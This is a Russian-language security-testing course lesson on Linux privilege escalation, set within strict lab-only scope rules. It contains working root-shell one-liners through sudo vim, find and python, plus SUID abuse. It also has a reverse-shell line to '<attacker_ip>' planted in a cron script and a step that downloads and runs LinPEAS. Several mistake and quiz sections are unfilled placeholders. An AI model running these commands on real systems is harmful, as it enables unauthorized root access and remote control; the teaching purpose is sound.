# Занятие 55. Privilege Escalation Linux: sudo, SUID, crontab

## Учебная рамка

**Входные требования:** Пройдены базовые Linux, сети, web и инструменты; студент понимает правила scope учебных платформ.

**Результат занятия:** Студент проходит учебную комнату/машину, ведет заметки и превращает действия в воспроизводимый write-up без публикации секретных флагов.

**Наследуемая SDET-компетенция:** перенос lab-навыков в продуктовый QA без выхода за scope, write-up discipline и hypothesis tracking.

**Security QA-компетенция:** осознанный перенос CTF/academy-навыков в продуктовый контекст и фиксация запретов.

**Связь с книгами:** PortSwigger/THM/HTB как lab-transfer; «Black Hat Python» только для понимания lab-техник, boundaries и defensive interpretation.

**Основной источник:** `Black Hat Python` только lab-only, «PyCharm. Профессиональная работа на Python 2024» для write-ups и evidence discipline.

**Дополнительные источники:** «Паттерны разработки на Python» для переноса lab-навыков в поддерживаемые process artifacts.

**Что берем из источника:** lab-to-product transfer, structured notes, boundaries, write-up discipline, отделение exploitation от product QA.

**Как это превращается в SDET/Security QA навык:** переносить из THM/HTB/PortSwigger только безопасные QA-аналогии и артефакты.

**Что нельзя переносить на Slider AI без отдельного разрешения:** не переносить exploitation, privesc, bypass и aggressive enumeration на Slider AI без расширенного scope.


**Процессный артефакт:** `VULNERABILITY_TRIAGE.md`: lab-to-product transfer matrix и ограничения scope.

**Безопасная цель:** TryHackMe, Hack The Box, PortSwigger Academy и другие платформы только в рамках их правил и активной учебной машины.

**Среда выполнения:** Основной путь — macOS native, браузер, DevTools, Homebrew и Python. Kali Linux ARM64 VM, UTM или cloud lab используются только если это явно требуется задачей или вынесено в углубление.

**Обязательный путь новичка:** Пройти указанную комнату или ее часть, записать команды, ошибки и выводы без копирования чужого решения.

**Углубление:** После самостоятельной попытки разобрать официальный write-up, сравнить подходы и улучшить собственные заметки.

**Минимальная проверка успеха:** Есть подтверждение прохождения этапа, список команд, выводы и пометка, что работа велась внутри учебной платформы.

**Эталонный вывод:** Отчет содержит название комнаты, цель, основные шаги, фрагменты вывода и выводы без раскрытия приватных флагов.

**Критерии сдачи:** Зачет: завершен обязательный этап и оформлены заметки. Отлично: добавлена ретроспектива ошибок и альтернативный путь решения.

## Reading pack из книг курса

Этот раздел не является заданием “пойди и найди теорию в книгах”. Книги использованы автором курса для подготовки лекции `Занятие 55. Privilege Escalation Linux: sudo, SUID, crontab`, а студент получает самодостаточное объяснение в разделах `Source-driven theory` и `Теория`.

- `docs/socraticode/black-hat-python-ru-pages/` только lab-only/defensive
- `docs/socraticode/pycharm-professional-python-2024-pages/`

Конкретные страницы для этого блока: `black-hat-python-ru-pages/page-060.md`-`page-178.md` только lab-only; `pycharm-professional-python-2024-pages/page-178.md`-`page-209.md`.

Что обязана объяснить лекция на основе этих книг:

1. Термины и команды, которые прямо поддерживают тему урока.
2. Инженерный принцип, который переносится из SDET в Security QA.
3. Ограничение безопасности: что нельзя делать на Slider AI без approval.
4. Пример, который превращается в evidence, helper, checklist или process artifact.

Если книга описывает опасную технику, она переносится только в lab-only или defensive interpretation. Студент не должен обращаться к книгам, чтобы понять базовую теорию текущего урока.

## Source-driven theory

Этот урок опирается на книжные источники курса как на базу, а не как на факультативное чтение. Из источников берется практическая дисциплина: lab-to-product transfer, structured notes, boundaries, write-up discipline, отделение exploitation от product QA. Для SDET это важно потому, что security-проверка должна быть воспроизводимой, объяснимой и пригодной для отчета, а не превращаться в набор разрозненных команд.

Книжный материал в уроке используется в трех шагах:

1. Понять термин или технику на безопасном примере.
2. Перевести идею в QA-действие: test case, observation, evidence, helper или process artifact.
3. Отделить разрешенную практику от действий, которые требуют отдельного approval.

Граница для Slider AI: не переносить exploitation, privesc, bypass и aggressive enumeration на Slider AI без расширенного scope. Если нужная техника выходит за эту границу, результат урока оформляется как `requires approval`, lab-only practice или defensive recommendation.

## Теория

**Privilege Escalation (повышение привилегий)** — процесс получения прав выше тех, что были изначально. В Linux цель обычно — получение прав root.

**Основные векторы повышения привилегий в Linux:**

### 1. Sudo (выполнение от имени другого пользователя)
Проверка: `sudo -l`
Если разрешено выполнение определенных программ без пароля — можно эскалировать.

### 2. SUID (Set User ID)
Программы с битом SUID выполняются с правами владельца (обычно root).
Поиск: `find / -perm -4000 2>/dev/null`

### 3. Cron jobs (планировщик задач)
Скрипты, выполняемые по расписанию от имени root.
Проверка: `cat /etc/crontab`, `ls -la /etc/cron.*`

### 4. Capabilities
Особые привилегии для программ.
Проверка: `getcap -r / 2>/dev/null`

### 5. Kernel Exploits
Уязвимости ядра (редко используются на практике из-за риска сломать систему).

## Guided practice

1. После lab выпишите навык, который был отработан, и его безопасный QA-аналог.
2. Укажите, какие действия остаются только в lab и почему.
3. Сделайте одну безопасную Slider AI-проверку или оформите `not applicable`/`requires approval`.
4. Добавьте transfer card в матрицу подготовки к финальному assessment.

### Эталон самостоятельной работы

К концу guided practice у студента есть короткий Markdown-артефакт: цель проверки, выполненные шаги, sanitized evidence, интерпретация результата, границы применимости и следующий безопасный шаг.

## Практическое занятие

### Метод 1: Sudo abuse

**Проверка разрешений:**
```bash
sudo -l
```

**Пример: sudo с разрешением на vim**
```bash
sudo vim
:!/bin/bash
# Получаем shell от root
```

**Пример: sudo с разрешением на find**
```bash
sudo find / -exec /bin/bash \;
```

**Пример: sudo с разрешением на python**
```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

### Метод 2: SUID exploitation

**Поиск SUID-программ:**
```bash
find / -perm -4000 -type f 2>/dev/null
```

**Пример с nmap (старые версии):**
```bash
nmap --interactive
!sh
```

**Пример с find:**
```bash
find . -exec /bin/sh -p \; -quit
```

**Пример с cp/mv:**
Копируем /etc/passwd, меняем пароль root, возвращаем обратно.

### Метод 3: Cron jobs

**Проверка cron:**
```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

**Если скрипт в cron редактируемый:**
Добавляем в скрипт: `bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1`
Ждем выполнения cron — получаем reverse shell.

**Wildcard injection в tar:**
Если в cron есть `tar cf /backup/*` — можно использовать wildcard injection.

### Автоматизация: LinPEAS

```bash
# Скачиваем на целевую машину
wget <attacker_ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```


## Примеры вывода

Минимальный эталонный артефакт для сдачи:

```markdown
Environment: macOS native / Kali ARM64 VM / cloud lab / Slider AI olddev
Target: <разрешенная учебная цель или https://olddev.slider-ai.ru>
Action: <выполненная безопасная команда или ручной шаг>
Evidence: <санитизированный фрагмент вывода, скриншота или HTTP history>
Result status: finding / observation / not reproducible / not applicable / requires approval
Next step: <retest, remediation, approval request или lab-only follow-up>
```

В отчете студент указывает среду выполнения, безопасную цель, команду или ручные шаги и коротко объясняет, какая строка подтверждает результат.



## Частые ошибки

1. **Ошибка 1**: Типичная ошибка новичков в этом уроке.
2. **Ошибка 2**: Еще одна распространенная проблема.
3. **Ошибка 3**: Важный момент, который часто упускают.



## Вопросы на понимание

1. Вопрос 1 на понимание материала?
   <details><summary>Ответ</summary>Ответ на вопрос 1</details>
2. Вопрос 2 на понимание материала?
   <details><summary>Ответ</summary>Ответ на вопрос 2</details>
3. Вопрос 3 на понимание материала?
   <details><summary>Ответ</summary>Ответ на вопрос 3</details>



## Форматы флагов

- **TryHackMe**: `THM{...}`
- **HackTheBox**: `HTB{...}`
- **PortSwigger**: "Lab solved!" (без флагов)



## Адаптация под macOS (M2, 8GB)

- Для VPN используйте **Tunnelblick** (бесплатный OpenVPN клиент для macOS): скачайте .ovpn файл и откройте через Tunnelblick
- Виртуалки: используйте только при необходимости; для Apple Silicon выбирайте ARM64-образы в **UTM**, **VMware Fusion** или **Parallels**, а тяжелые лабы выносите в cloud lab
- "На 8GB RAM выделяйте VM не более 3-4GB"
- Docker работает нативно на M2: `docker pull <image>`
- Для macOS native используйте Homebrew или официальный installer: `brew install <tool>`; для явно помеченной Kali/Linux-среды допустим `apt`.
- Если требуется Python: `pip3 install <package>`


## Задачи для самостоятельного выполнения

1. **Машина "Beep"** (HTB) — повышение привилегий через SUID и sudo
2. **Машина "Kioptrix"** (VulnHub) — несколько векторов повышения привилегий
3. **Практика на TryHackMe:** комната "Linux PrivEsc" — пошаговый туториал по всем методам

> **Важно:** В реальном пентесте повышение привилегий критично — без прав администратора невозможно полностью оценить ущерб от атаки.

## Практика на Slider AI

**Цель стенда:** `https://olddev.slider-ai.ru`

**Контекст разрешения:** тестовый стенд проекта Slider AI, доступен QA для обучения и проверки безопасности. Production и любые другие домены не входят в это задание.

**Ограничения безопасности:** соблюдать `education/slider_ai_scope.md`; не выполнять DoS/load-тесты, brute force, destructive payloads, изменение чужих данных, извлечение секретов и действия вне согласованного scope.

**Уровень прогрессии:** Privilege escalation boundaries

### Минимум

Не выполнять privesc на Slider AI; описать, какие артефакты инфраструктуры были бы нужны и почему они вне scope.

### Практика Slider AI

Проверьте только клиентскую роль/права в UI, доступные вашей QA-учетной записи.

### Углубление после изучения следующих уроков

После разрешения от владельца окружения подготовьте вопросы по hardening, не команды privesc.

### Артефакт сдачи

Markdown-запись по шаблону из `education/slider_ai_scope.md`: урок, компонент Slider AI, шаги, фактический результат, доказательства без секретов, риск, рекомендация и статус.

### Критерий готовности

Задание выполнено только на `olddev.slider-ai.ru`, не выходит за scope, содержит проверяемый артефакт и явно отмечает `finding`, `informational`, `not reproducible`, `not applicable` или `requires approval`.

## Rubric

| Уровень | Что должно быть сдано |
|---|---|
| Зачет | Выполнен обязательный путь новичка, есть sanitized evidence, действия не выходят за scope |
| Хорошо | Есть объяснение риска или процесса, аккуратные шаги воспроизведения и корректный статус результата |
| Отлично | Результат связан с `Lab-to-Product Transfer`, remediation/retest или automation appendix |

## Self-check

1. Какая SDET-компетенция используется в уроке?
2. Какая часть объяснения опирается на книги курса?
3. Где проходит безопасная граница для Slider AI?
4. Какой артефакт можно показать команде без раскрытия секретов?
5. Что нужно вынести в углубление, lab-only или отдельный approval?
